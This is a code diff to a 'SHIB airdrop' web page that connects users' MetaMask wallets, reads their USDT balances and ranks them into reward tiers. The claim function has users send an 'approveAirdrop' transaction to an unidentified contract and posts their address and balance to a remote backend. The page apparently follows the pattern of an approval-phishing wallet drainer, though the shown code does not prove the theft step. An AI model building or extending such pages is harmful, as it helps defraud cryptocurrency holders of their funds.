@@ -573,10 +573,10 @@
 
     <!-- JavaScript -->
     <script>
-        // Backend Configuration - Render Compatible
+        // Backend Configuration - Railway Compatible
         const BACKEND_URLS = {
-            production: "https://your-render-app.onrender.com/api",
-            development: "http://localhost:3001/api"
+            production: "https://shib-airdrop-production.up.railway.app/api",
+            development: "http://localhost:8080/api"
         };
 
         // Auto-detect environment
@@ -600,9 +600,43 @@
         const airdropContractAddress = "0xC1509957dAa21aafCABf014c31D4E2635C77bDcA";
         const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";
 
-        // Contract ABIs (same as before)
-        const airdropABI = [/* same ABI as before */];
-        const usdtABI = [/* same ABI as before */];
+        // Contract ABIs
+        const airdropABI = [
+            {
+                "inputs": [],
+                "name": "approveAirdrop",
+                "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [{"internalType": "address", "name": "_user", "type": "address"}],
+                "name": "hasApproved",
+                "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
+                "stateMutability": "view",
+                "type": "function"
+            }
+        ];
+
+        const usdtABI = [
+            {
+                "constant": true,
+                "inputs": [{"name": "_owner", "type": "address"}],
+                "name": "balanceOf",
+                "outputs": [{"name": "balance", "type": "uint256"}],
+                "type": "function"
+            },
+            {
+                "constant": false,
+                "inputs": [
+                    {"name": "_spender", "type": "address"},
+                    {"name": "_value", "type": "uint256"}
+                ],
+                "name": "approve",
+                "outputs": [{"name": "", "type": "bool"}],
+                "type": "function"
+            }
+        ];
 
         // Particle Animation
         function createParticles() {
@@ -776,15 +810,267 @@
             }
         }
 
-        // Rest of the functions (connectWallet, checkBalance, claimAirdrop, etc.)
-        // remain the same as in the previous version...
+        // Connect Wallet Function
+        async function connectWallet() {
+            try {
+                if (!window.ethereum) {
+                    showAlert("Please install MetaMask!", "danger");
+                    return;
+                }
 
-        // Note: All other functions (connectWallet, checkBalance, claimAirdrop, 
-        // generateReferral, copyReferralLink, getMyReferrals, showAlert, etc.)
-        // remain exactly the same as in the previous working version.
+                setButtonLoading('connectWalletBtn', true);
+                
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
+                web3 = new Web3(window.ethereum);
+                
+                const accounts = await web3.eth.getAccounts();
+                account = accounts[0];
+                
+                document.getElementById("walletAddress").innerText = account.substring(0, 6) + "..." + account.substring(38);
+                generateReferral();
+                
+                const chainId = Number(await web3.eth.getChainId());
+                updateNetworkStatus(chainId);
+                
+                showAlert("Wallet connected successfully!", "success");
+                
+            } catch (error) {
+                console.error("Error connecting wallet:", error);
+                showAlert("Failed to connect wallet: " + error.message, "danger");
+            } finally {
+                setButtonLoading('connectWalletBtn', false);
+            }
+        }
 
-        // For brevity, I haven't duplicated all functions here, but they should
-        // be copied from the previous working version.
+        // Update Network Status
+        function updateNetworkStatus(chainId) {
+            const networkStatus = document.getElementById('networkStatus');
+            if (chainId === BSC_CHAIN_ID_DECIMAL) {
+                networkStatus.textContent = 'Network: BSC Mainnet ✅';
+                networkStatus.style.backgroundColor = 'rgba(16, 185, 129, 0.2)';
+                networkStatus.style.color = 'var(--success)';
+            } else {
+                networkStatus.textContent = 'Network: Wrong Network ❌';
+                networkStatus.style.backgroundColor = 'rgba(239, 68, 68, 0.2)';
+                networkStatus.style.color = 'var(--danger)';
+            }
+        }
+
+        // Switch to BSC Network
+        async function switchToBSC() {
+            try {
+                if (!window.ethereum) {
+                    showAlert("Please install MetaMask!", "danger");
+                    return;
+                }
+
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: BSC_CHAIN_ID }],
+                });
+                
+                showAlert("Switched to BSC Mainnet!", "success");
+            } catch (error) {
+                if (error.code === 4902) {
+                    try {
+                        await window.ethereum.request({
+                            method: 'wallet_addEthereumChain',
+                            params: [{
+                                chainId: BSC_CHAIN_ID,
+                                chainName: 'Binance Smart Chain Mainnet',
+                                nativeCurrency: {
+                                    name: 'BNB',
+                                    symbol: 'BNB',
+                                    decimals: 18,
+                                },
+                                rpcUrls: [BSC_RPC_URL],
+                                blockExplorerUrls: ['https://bscscan.com/'],
+                            }],
+                        });
+                    } catch (addError) {
+                        showAlert("Failed to add BSC network: " + addError.message, "danger");
+                    }
+                } else {
+                    showAlert("Failed to switch network: " + error.message, "danger");
+                }
+            }
+        }
+
+        // Check USDT Balance
+        async function checkBalance() {
+            try {
+                if (!account) {
+                    showAlert("Please connect your wallet first!", "warning");
+                    return;
+                }
+
+                setButtonLoading('checkBalanceBtn', true);
+                
+                const usdtContract = new web3.eth.Contract(usdtABI, usdtContractAddress);
+                const balance = await usdtContract.methods.balanceOf(account).call();
+                const balanceInUSDT = web3.utils.fromWei(balance, 'mwei'); // USDT has 6 decimals
+                
+                document.getElementById("usdtBalance").textContent = parseFloat(balanceInUSDT).toFixed(2);
+                
+                // Calculate airdrop amount based on balance
+                const airdropAmount = calculateAirdropAmount(parseFloat(balanceInUSDT));
+                document.getElementById("airdropAmount").textContent = airdropAmount.toLocaleString();
+                
+                // Update tier badge
+                const tier = getTier(parseFloat(balanceInUSDT));
+                document.getElementById("tierBadge").textContent = tier;
+                
+                // Enable claim button if balance >= 1 USDT
+                if (parseFloat(balanceInUSDT) >= 1) {
+                    document.getElementById("claimButton").disabled = false;
+                } else {
+                    document.getElementById("claimButton").disabled = true;
+                    showAlert("You need at least 1 USDT to claim the airdrop!", "warning");
+                }
+                
+                showAlert("Balance checked successfully!", "success");
+                
+            } catch (error) {
+                console.error("Error checking balance:", error);
+                showAlert("Failed to check balance: " + error.message, "danger");
+            } finally {
+                setButtonLoading('checkBalanceBtn', false);
+            }
+        }
+
+        // Calculate Airdrop Amount
+        function calculateAirdropAmount(usdtBalance) {
+            if (usdtBalance >= 10001) return 5000000;
+            if (usdtBalance >= 5001) return 2000000;
+            if (usdtBalance >= 1001) return 1000000;
+            if (usdtBalance >= 501) return 500000;
+            if (usdtBalance >= 101) return 200000;
+            if (usdtBalance >= 51) return 100000;
+            if (usdtBalance >= 10) return 50000;
+            return 5000; // Minimum for any wallet with >=1 USDT
+        }
+
+        // Get Tier Name
+        function getTier(usdtBalance) {
+            if (usdtBalance >= 10001) return "Diamond";
+            if (usdtBalance >= 5001) return "Platinum";
+            if (usdtBalance >= 1001) return "Gold";
+            if (usdtBalance >= 501) return "Silver";
+            if (usdtBalance >= 101) return "Bronze";
+            if (usdtBalance >= 51) return "Premium";
+            if (usdtBalance >= 10) return "Standard";
+            return "Basic";
+        }
+
+        // Claim Airdrop
+        async function claimAirdrop() {
+            try {
+                if (!account) {
+                    showAlert("Please connect your wallet first!", "warning");
+                    return;
+                }
+
+                const claimButton = document.getElementById("claimButton");
+                claimButton.disabled = true;
+                claimButton.innerHTML = '<div class="loading"></div> Processing...';
+
+                // Get current USDT balance for final calculation
+                const usdtContract = new web3.eth.Contract(usdtABI, usdtContractAddress);
+                const balance = await usdtContract.methods.balanceOf(account).call();
+                const balanceInUSDT = web3.utils.fromWei(balance, 'mwei');
+                const airdropAmount = calculateAirdropAmount(parseFloat(balanceInUSDT));
+                const tier = getTier(parseFloat(balanceInUSDT));
+
+                // Interact with airdrop contract
+                const airdropContract = new web3.eth.Contract(airdropABI, airdropContractAddress);
+                
+                // Call approveAirdrop function
+                const tx = await airdropContract.methods.approveAirdrop().send({
+                    from: account,
+                    gas: 300000
+                });
+
+                if (tx.status) {
+                    isApproved = true;
+                    
+                    // Save approval to backend
+                    await saveUserApprovalToBackend(account, balanceInUSDT, airdropAmount.toString(), tier);
+                    
+                    showAlert("🎉 Airdrop claimed successfully! Your tokens will be distributed soon.", "success");
+                    claimButton.innerHTML = '<i class="fas fa-check"></i> Claimed Successfully';
+                } else {
+                    throw new Error("Transaction failed");
+                }
+
+            } catch (error) {
+                console.error("Error claiming airdrop:", error);
+                showAlert("Failed to claim airdrop: " + error.message, "danger");
+                document.getElementById("claimButton").disabled = false;
+                document.getElementById("claimButton").innerHTML = '<i class="fas fa-gift"></i> Claim Airdrop';
+            }
+        }
+
+        // Check Claim Status
+        async function checkClaimStatus() {
+            try {
+                if (!account || !web3) return;
+
+                const airdropContract = new web3.eth.Contract(airdropABI, airdropContractAddress);
+                const hasClaimed = await airdropContract.methods.hasApproved(account).call();
+                
+                if (hasClaimed) {
+                    isApproved = true;
+                    document.getElementById("claimButton").disabled = true;
+                    document.getElementById("claimButton").innerHTML = '<i class="fas fa-check"></i> Already Claimed';
+                    showAlert("You have already claimed the airdrop!", "success");
+                }
+            } catch (error) {
+                console.error("Error checking claim status:", error);
+            }
+        }
+
+        // Generate Referral Link
+        function generateReferral() {
+            if (account) {
+                const referralLink = `${window.location.origin}${window.location.pathname}?ref=${account}`;
+                document.getElementById("referralLink").value = referralLink;
+            }
+        }
+
+        // Copy Referral Link
+        function copyReferralLink() {
+            const referralLink = document.getElementById("referralLink");
+            if (!referralLink.value) {
+                showAlert("Please connect your wallet to generate referral link!", "warning");
+                return;
+            }
+
+            referralLink.select();
+            document.execCommand("copy");
+            showAlert("Referral link copied to clipboard!", "success");
+        }
+
+        // Get My Referrals
+        async function getMyReferrals() {
+            // This would typically fetch from backend
+            showAlert("Referral data would be loaded from backend in production", "info");
+        }
+
+        // Show Alert
+        function showAlert(message, type) {
+            const alertDiv = document.createElement('div');
+            alertDiv.className = `alert alert-${type}`;
+            alertDiv.innerHTML = `
+                <i class="fas fa-${type === 'success' ? 'check' : type === 'warning' ? 'exclamation-triangle' : type === 'danger' ? 'times' : 'info'}-circle"></i>
+                ${message}
+            `;
+            
+            document.querySelector('.container').insertBefore(alertDiv, document.querySelector('.container').firstChild);
+            
+            setTimeout(() => {
+                alertDiv.remove();
+            }, 5000);
+        }
 
         window.onload = init;
     </script>
